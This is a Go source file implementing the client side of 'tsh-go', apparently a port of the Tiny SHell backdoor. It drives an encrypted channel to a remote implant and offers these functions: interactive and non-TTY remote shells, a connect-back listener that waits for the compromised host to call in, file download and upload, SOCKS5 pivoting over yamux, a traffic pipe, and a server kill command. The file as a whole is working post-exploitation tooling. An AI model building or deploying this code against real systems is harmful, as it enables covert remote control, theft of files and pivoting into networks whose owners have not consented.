package client

import (
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"path/filepath"
	"strings"
	"sync"

	"tsh-go/internal/constants"
	"tsh-go/internal/pel"
	"tsh-go/internal/protocol"
	"tsh-go/internal/utils"

	"github.com/hashicorp/yamux"
	"github.com/schollz/progressbar/v3"
	terminal "golang.org/x/term"
)

type RunShellArgs struct {
	Command string
}

type GetFileArgs struct {
	Src string
	Dst string
}

type PutFileArgs struct {
	Src string
	Dst string
}

type Socks5Args struct {
	Socks5Addr string
}

type PipeArgs struct {
	TargetAddr string
}

func Run(secret []byte, host string, port int, mode protocol.Mode, arg any) error {
	// apply kdf
	secret = utils.KDF(secret)

	var isConnectBack bool

	if host == "cb" {
		isConnectBack = true
	}

	var connectBackListener *pel.PktEncLayerListener
	var err error

	waitForConnection := func() (utils.DuplexStreamEx, error) {
		// avoid calling this concurrently in connect-back mode
		// because multiple goroutines trying to listen on same port = error
		// a lock may fix this lol
		if isConnectBack {
			addr := fmt.Sprintf(":%d", port)
			for {
				connectBackListener, err = pel.Listen(addr, secret, false)
				if err != nil {
					return nil, err
				}
				log.Print("Waiting for the server to connect...")
				stream, err := connectBackListener.Accept()
				connectBackListener.Close()
				if err != nil {
					log.Printf("Accept failed: %v\n", err)
					continue
				}
				log.Println("connected.")
				if err := protocol.WriteRequest(stream, protocol.Request{Mode: mode}); err != nil {
					stream.Close()
					return nil, err
				}
				return stream, nil
			}
		} else {
			addr := fmt.Sprintf("%s:%d", host, port)
			stream, err := pel.Dial(addr, secret, true)
			if err != nil {
				return nil, err
			}
			if err := protocol.WriteRequest(stream, protocol.Request{Mode: mode}); err != nil {
				stream.Close()
				return nil, err
			}
			return stream, nil
		}
	}

	switch mode {
	case protocol.Kill:
		stream, err := waitForConnection()
		if err != nil {
			return err
		}
		stream.Close()
		log.Println("Server killed")
		return nil
	case protocol.RunShell:
		return handleRunShell(waitForConnection, arg.(RunShellArgs))
	case protocol.GetFile:
		return handleGetFile(waitForConnection, arg.(GetFileArgs))
	case protocol.PutFile:
		return handlePutFile(waitForConnection, arg.(PutFileArgs))
	case protocol.SOCKS5:
		return handleSocks5(waitForConnection, arg.(Socks5Args))
	case protocol.Pipe:
		return handlePipe(waitForConnection, arg.(PipeArgs))
	case protocol.RunShellNoTTY:
		return handleRunShellNoTTY(waitForConnection, arg.(RunShellArgs))
	}
	return fmt.Errorf("unknown client mode: %s", mode)
}

func handleGetFile(waitForConnection func() (utils.DuplexStreamEx, error), arg GetFileArgs) error {
	stream, err := waitForConnection()
	if err != nil {
		return err
	}
	defer stream.Close()
	buffer := make([]byte, constants.MaxMessagesize)

	basename := strings.ReplaceAll(arg.Src, "\\", "/")
	basename = filepath.Base(filepath.FromSlash(basename))

	destination := arg.Dst
	var writer io.Writer

	bar := progressbar.NewOptions(-1,
		progressbar.OptionSetWidth(20),
		progressbar.OptionEnableColorCodes(true),
		progressbar.OptionShowBytes(true),
		progressbar.OptionShowCount(),
		progressbar.OptionSetDescription("Downloading"),
		progressbar.OptionSpinnerType(22),
		progressbar.OptionSetWriter(os.Stderr),
	)

	if arg.Dst == "-" {
		// if dst is "-", write to stdout
		writer = os.Stdout
		if !terminal.IsTerminal(int(os.Stdout.Fd())) {
			// progress bar for file transfer if stdout is not a tty
			writer = io.MultiWriter(writer, bar)
		}
	} else {
		// if dst is a directory, save file to dst/basename
		// otherwise, save file to dst
		if fi, err := os.Stat(destination); err == nil && fi.IsDir() {
			destination = filepath.Join(destination, basename)
		}

		f, err := os.OpenFile(destination, os.O_CREATE|os.O_RDWR|os.O_TRUNC, 0644)
		if err != nil {
			return err
		}
		defer f.Close()

		writer = io.MultiWriter(f, bar)
	}

	err = utils.WriteVarLength(stream, []byte(arg.Src))
	if err != nil {
		return err
	}
	_, err = utils.CopyBuffer(writer, stream, buffer)
	if err != nil {
		return err
	}
	return nil
}

func handlePutFile(waitForConnection func() (utils.DuplexStreamEx, error), arg PutFileArgs) error {
	stream, err := waitForConnection()
	if err != nil {
		return err
	}
	defer stream.Close()

	var reader io.Reader
	var fsize int64
	var basename string

	if arg.Src == "-" {
		// if src is "-", read from stdin
		reader = os.Stdin
		fsize = -1
		basename = "stdin"
	} else {
		f, err := os.Open(arg.Src)
		if err != nil {
			return err
		}
		defer f.Close()
		reader = f

		fi, err := f.Stat()
		if err != nil {
			return err
		}
		fsize = fi.Size()
		basename = filepath.Base(arg.Src)
	}

	err = utils.WriteVarLength(stream, []byte(arg.Dst))
	if err != nil {
		return err
	}
	err = utils.WriteVarLength(stream, []byte(basename))
	if err != nil {
		return err
	}

	bar := progressbar.NewOptions(int(fsize),
		progressbar.OptionSetWidth(20),
		progressbar.OptionEnableColorCodes(true),
		progressbar.OptionShowBytes(true),
		progressbar.OptionShowCount(),
		progressbar.OptionSetDescription("Uploading"),
		progressbar.OptionSetWriter(os.Stderr),
	)
	var writer io.Writer = stream
	if reader != os.Stdin || (reader == os.Stdin && !terminal.IsTerminal(int(os.Stdin.Fd()))) {
		// show progress bar if:
		//   - src is not stdin
		//   - src is stdin but stdin is not a tty
		writer = io.MultiWriter(stream, bar)
	}

	_, err = utils.CopyBuffer(writer, reader, make([]byte, constants.MaxMessagesize))
	if err != nil {
		return err
	}
	return nil
}

func handleRunShell(waitForConnection func() (utils.DuplexStreamEx, error), arg RunShellArgs) error {
	stream, err := waitForConnection()
	if err != nil {
		return err
	}
	defer stream.Close()
	oldState, err := terminal.MakeRaw(int(os.Stdin.Fd()))
	if err != nil {
		return err
	}

	defer func() {
		_ = terminal.Restore(int(os.Stdin.Fd()), oldState)
		_ = recover()
	}()

	term := os.Getenv("TERM")
	if term == "" {
		term = "vt100"
	}
	err = utils.WriteVarLength(stream, []byte(term))
	if err != nil {
		return err
	}

	// if stdout is not a tty it is likely a pipe to a file
	// so we make it max-sized for easier processing
	// note that the remote "always" open a pty to run the command
	ws_col, ws_row := 65535, 65535
	if terminal.IsTerminal(int(os.Stdout.Fd())) {
		ws_col, ws_row, _ = terminal.GetSize(int(os.Stdout.Fd()))
	}
	ws := make([]byte, 4)
	ws[0] = byte((ws_row >> 8) & 0xFF)
	ws[1] = byte((ws_row) & 0xFF)
	ws[2] = byte((ws_col >> 8) & 0xFF)
	ws[3] = byte((ws_col) & 0xFF)
	_, err = stream.Write(ws)
	if err != nil {
		return err
	}

	err = utils.WriteVarLength(stream, []byte(arg.Command))
	if err != nil {
		return err
	}
	utils.DuplexPipe(utils.DSEFromRW(os.Stdin, os.Stdout), stream, nil, nil)
	return nil
}
func handleRunShellNoTTY(waitForConnection func() (utils.DuplexStreamEx, error), arg RunShellArgs) error {
	stream, err := waitForConnection()
	if err != nil {
		return err
	}
	defer stream.Close()

	err = utils.WriteVarLength(stream, []byte(arg.Command))
	if err != nil {
		return err
	}
	utils.DuplexPipe(utils.DSEFromRW(os.Stdin, os.Stdout), stream, nil, nil)
	return nil
}
func handleSocks5(waitForConnection func() (utils.DuplexStreamEx, error), arg Socks5Args) error {
	addr, err := net.ResolveTCPAddr("tcp", arg.Socks5Addr)
	if err != nil {
		return err
	}
	l, err := net.ListenTCP("tcp", addr)
	if err != nil {
		return err
	}
	log.Println("Socks5 proxy listening at", l.Addr())

	// use yamux to multiplex multiple socks5 streams over a connection
	// especially useful in connect-back mode so we don't need to wait for a delay for every connection

	var mu sync.Mutex // lock for mutation to session
	var session *yamux.Session
	getSession := func() (*yamux.Session, error) {
		// ensure there is only one yamux session even if called concurrently
		mu.Lock()
		defer mu.Unlock()

		if session != nil && !session.IsClosed() {
			return session, nil
		}

		stream, err := waitForConnection()
		if err != nil {
			return nil, err
		}
		config := yamux.DefaultConfig()
		config.LogOutput = io.Discard
		nextSession, err := yamux.Client(stream, config)
		if err != nil {
			stream.Close()
			return nil, err
		}
		session = nextSession
		return session, nil
	}

	for {
		conn, err := l.AcceptTCP()
		if err != nil {
			log.Println(err)
			continue
		}
		go func(conn *net.TCPConn) {
			currentSession, err := getSession()
			if err != nil {
				conn.Close()
				log.Println("Failed to establish socks5 mux session:", err)
				return
			}
			stream, err := currentSession.Open()
			if err != nil {
				// if opening stream failed, treat the session as broken and close it
				// so the next connection will create a new session with waitForConnection
				mu.Lock()
				if session == currentSession {
					// note this goroutine may run concurrently
					// we need to ensure we are closing the correct session
					session.Close()
					session = nil
				}
				mu.Unlock()
				conn.Close()
				log.Println("Failed to open socks5 mux stream:", err)
				return
			}
			log.Println("Connection established", conn.RemoteAddr())
			utils.DuplexPipe(conn, utils.DSEFromRW(stream, stream), nil, nil)
			log.Println("Connection closed", conn.RemoteAddr())
		}(conn)
	}
}

func handlePipe(waitForConnection func() (utils.DuplexStreamEx, error), arg PipeArgs) error {
	stream, err := waitForConnection()
	if err != nil {
		return err
	}
	if err := utils.WriteVarLength(stream, []byte(arg.TargetAddr)); err != nil {
		stream.Close()
		return err
	}
	utils.DuplexPipe(utils.DSEFromRW(os.Stdin, os.Stdout), stream, nil, nil)
	return nil
}
